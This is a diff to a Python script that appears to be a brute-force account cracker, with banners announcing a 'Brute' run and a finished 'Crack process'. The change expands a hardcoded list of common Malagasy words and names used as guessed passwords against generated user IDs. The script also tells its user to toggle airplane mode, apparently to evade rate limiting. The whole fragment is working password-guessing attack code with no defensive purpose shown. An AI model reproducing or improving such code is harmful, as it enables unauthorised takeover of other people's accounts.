@@ -79,7 +79,7 @@ def mg_randome():
   print('\033[1;37;1m[$] Brute Has been started...(\033[1;92mUPDATE RANDOME \033[1;97m)');print(47*'-');print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*'-')
   for psx in user:
    ids = kode+psx
-   passlist = {psx,ids,'malala','malalako','vadiko','faniry','tahina','rakoto','fitiavana','malagasy','sitraka','razafy','anjara','sarobidy','vahatra','lahatra','fandresena','nantenaina','nomena','niaina','mandresy','hasina','ravaka','malalatiana','felana','valisoa','gasikara','madagascar','tsiresy','milely','vadiko','faneva','tiavina','fanomezana','fanomezantsoa','sahaza','avotra','tafita','mamiko','mamako','zanako','jesosy','finoana','fiderana','nomentsoa','lelena','mirana','fitahiana','fitahina','badoda','mahery','lataka','mamisoa','anjara','lahatra','minosoa'}
+   passlist = {psx,ids,'malala','malalako','fitahiana','sitraka','sariaka','santatra','zanako','rafotsy','niaina','narindra','anjara','tsilavina','vadiko','faniry','tahina','rakoto','fitiavana','malagasy','sitraka','razafy','anjara','sarobidy','vahatra','lahatra','fandresena','nantenaina','nomena','niaina','mandresy','hasina','ravaka','malalatiana','felana','valisoa','gasikara','madagascar','tsiresy','milely','vadiko','faneva','tiavina','fanomezana','fanomezantsoa','sahaza','avotra','tafita','mamiko','mamako','zanako','jesosy','finoana','fiderana','nomentsoa','lelena','mirana','fitahiana','fitahina','badoda','mahery','lataka','mamisoa','anjara','lahatra','minosoa'}
    jmk.submit(rndm,ids,passlist)
  print(47*'\n\033[1;37m-')
  print('[√] Crack process has been completed')
